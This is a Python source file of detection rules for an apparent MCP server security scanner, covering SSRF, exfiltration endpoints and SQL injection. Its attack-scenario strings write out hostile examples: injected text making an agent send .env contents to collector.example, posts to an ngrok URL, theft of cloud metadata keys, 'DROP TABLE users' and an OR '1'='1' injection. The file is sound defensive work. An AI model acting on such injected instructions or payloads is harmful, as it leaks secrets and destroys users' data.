# SPDX-License-Identifier: PolyForm-Noncommercial-1.0.0
# Copyright (c) 2026 Aevrin. See the LICENSE and NOTICE files.
"""Network access and SQL."""

from __future__ import annotations

import re
from collections.abc import Iterable

from mcp_scanner.analyzers.capabilities import Capability
from mcp_scanner.analyzers.source import facts as f
from mcp_scanner.models.finding import FindingCandidate, TargetKind
from mcp_scanner.models.severity import Category, Confidence, Severity
from mcp_scanner.rules.base import NEEDS_SOURCE, Rule
from mcp_scanner.rules.helpers import (
    capability_confidence,
    code_evidence,
    function_has,
    hit_target,
    lower_for_js,
    signal_evidence,
)
from mcp_scanner.scanner.context import ScanContext

CWE_918 = "https://cwe.mitre.org/data/definitions/918.html"
CWE_89 = "https://cwe.mitre.org/data/definitions/89.html"


class OpenUrlFetch(Rule):
    id = "MCP-NET-001"
    title = "Tool can request any URL"
    category = Category.NETWORK
    severity = Severity.MEDIUM
    description = "A tool sends HTTP requests to a URL or host that the agent chooses."
    why_it_matters = (
        "It can reach internal services (server side request forgery) and it is an easy way to send stolen data out, "
        "for example as a URL query string."
    )
    attack_scenario = "Injected text asks the agent to fetch https://collector.example/?d=<contents of .env>."
    recommendation = "Block private and link-local addresses, and limit the tool to the domains it needs."
    references = (CWE_918,)

    def check(self, ctx: ScanContext) -> Iterable[FindingCandidate]:
        for tool in ctx.tools:
            caps = ctx.capabilities.get(tool.name)
            if caps is None or not caps.has(Capability.NETWORK):
                continue
            yield self.finding(
                TargetKind.TOOL,
                tool.name,
                f"Tool '{tool.name}' makes web requests to addresses the agent picks: "
                + "; ".join(s.reason for s in caps.signals[Capability.NETWORK][:2])
                + ".",
                signal_evidence(caps.signals[Capability.NETWORK]),
                confidence=capability_confidence(caps, Capability.NETWORK),
            )


class ExfiltrationEndpointInSource(Rule):
    id = "MCP-NET-002"
    title = "Code sends data to a data collection service"
    category = Category.DATA_EXFILTRATION
    severity = Severity.HIGH
    description = (
        "Source code contains a hardcoded destination like webhook.site, ngrok, pastebin, or a raw IP address."
    )
    why_it_matters = "These services are used to catch stolen data. A real integration names its own API host."
    attack_scenario = "After each call, the server posts the tool arguments to https://abc.ngrok-free.app/log."
    recommendation = "Find out what is sent there. Remove the server if the destination is not explained."
    needs = frozenset({NEEDS_SOURCE})

    def check(self, ctx: ScanContext) -> Iterable[FindingCandidate]:
        assert ctx.source is not None
        for hit in ctx.source.hits_for(f.EXFIL_ENDPOINT):
            steals = function_has(ctx.source, hit, f.ENV_DUMP, f.SENSITIVE_PATH, f.FILE_READ)
            kind, name = hit_target(hit)
            yield self.finding(
                kind,
                name,
                f"The code has a {hit.detail}"
                + (", in a function that also reads secrets or files." if steals else "."),
                [code_evidence(hit)],
                severity=Severity.CRITICAL if steals else Severity.HIGH,
                confidence=Confidence.HIGH if steals else lower_for_js(hit, Confidence.MEDIUM),
                malicious=steals,
            )


class SsrfInSource(Rule):
    id = "MCP-NET-003"
    title = "Tool input decides where a network request goes"
    category = Category.NETWORK
    severity = Severity.MEDIUM
    description = "Source code makes an HTTP request to a URL built from tool input, without an address check."
    why_it_matters = "The server can be used to reach internal systems or cloud metadata endpoints (169.254.169.254)."
    attack_scenario = "The agent is told to fetch http://169.254.169.254/latest/meta-data/iam/ and returns cloud keys."
    recommendation = "Check the host against an allow list and block private, loopback, and link-local addresses."
    references = (CWE_918,)
    needs = frozenset({NEEDS_SOURCE})

    def check(self, ctx: ScanContext) -> Iterable[FindingCandidate]:
        assert ctx.source is not None
        for hit in ctx.source.hits_for(f.NETWORK):
            if not hit.tainted:
                continue
            kind, name = hit_target(hit)
            yield self.finding(
                kind,
                name,
                f"Tool input reaches a network call ({hit.detail}).",
                [code_evidence(hit)],
                confidence=lower_for_js(hit, Confidence.MEDIUM),
            )


class RawSqlTool(Rule):
    id = "MCP-SQL-001"
    title = "Tool runs raw SQL"
    category = Category.INJECTION
    severity = Severity.MEDIUM
    description = "A tool accepts free SQL text and runs it against a database."
    why_it_matters = (
        "A tricked agent can read every table, change data, or drop tables, within the database user's rights."
    )
    attack_scenario = "Injected text asks the agent to run 'DROP TABLE users' or to select all password hashes."
    recommendation = "Use a read-only database user, block write statements, or offer fixed query tools instead."
    references = (CWE_89,)

    def check(self, ctx: ScanContext) -> Iterable[FindingCandidate]:
        for tool in ctx.tools:
            caps = ctx.capabilities.get(tool.name)
            if caps is None or not caps.strong(Capability.DATABASE):
                continue
            read_only = bool(
                re.search(
                    r"\bread[\s-]?only\b|\bonly\s+select\b|\bselect\s+(?:queries|statements)\s+only\b",
                    tool.description,
                    re.I,
                )
            )
            yield self.finding(
                TargetKind.TOOL,
                tool.name,
                f"Tool '{tool.name}' runs SQL that the agent writes"
                + (". The description says it is read-only, which limits the damage." if read_only else "."),
                signal_evidence(caps.signals[Capability.DATABASE]),
                confidence=Confidence.HIGH,
                severity=Severity.LOW if read_only else Severity.MEDIUM,
            )


_SQL_BUILD = re.compile(r"""execute\w*\(\s*(?:f["']|["'][^"']*["']\s*(?:%|\+|\.format)|\w+\s*\+)|\.format\(|%\s*\(""")


class SqlInjectionInSource(Rule):
    id = "MCP-SQL-002"
    title = "SQL built from tool input"
    category = Category.INJECTION
    severity = Severity.HIGH
    description = "Source code builds a SQL statement with string formatting from tool input."
    why_it_matters = "Quotes in the input can change the statement and read or change other data."
    attack_scenario = (
        "A 'find_user' tool runs f\"SELECT * FROM users WHERE name = '{name}'\". The name is \"x' OR '1'='1\"."
    )
    recommendation = "Use parameters: cursor.execute('... WHERE name = ?', (name,))."
    references = (CWE_89,)
    needs = frozenset({NEEDS_SOURCE})

    def check(self, ctx: ScanContext) -> Iterable[FindingCandidate]:
        assert ctx.source is not None
        for hit in ctx.source.hits_for(f.SQL):
            if not hit.tainted:
                continue
            built = bool(_SQL_BUILD.search(hit.snippet))
            parameterized = re.search(r"execute\w*\([^,()]+,\s*[\(\[{]", hit.snippet) is not None
            if parameterized and not built:
                continue
            kind, name = hit_target(hit)
            yield self.finding(
                kind,
                name,
                "Tool input is formatted into a SQL statement."
                if built
                else "Tool input reaches a SQL call; check that it is parameterized.",
                [code_evidence(hit)],
                confidence=Confidence.HIGH if built else Confidence.LOW,
                severity=Severity.HIGH if built else Severity.MEDIUM,
            )
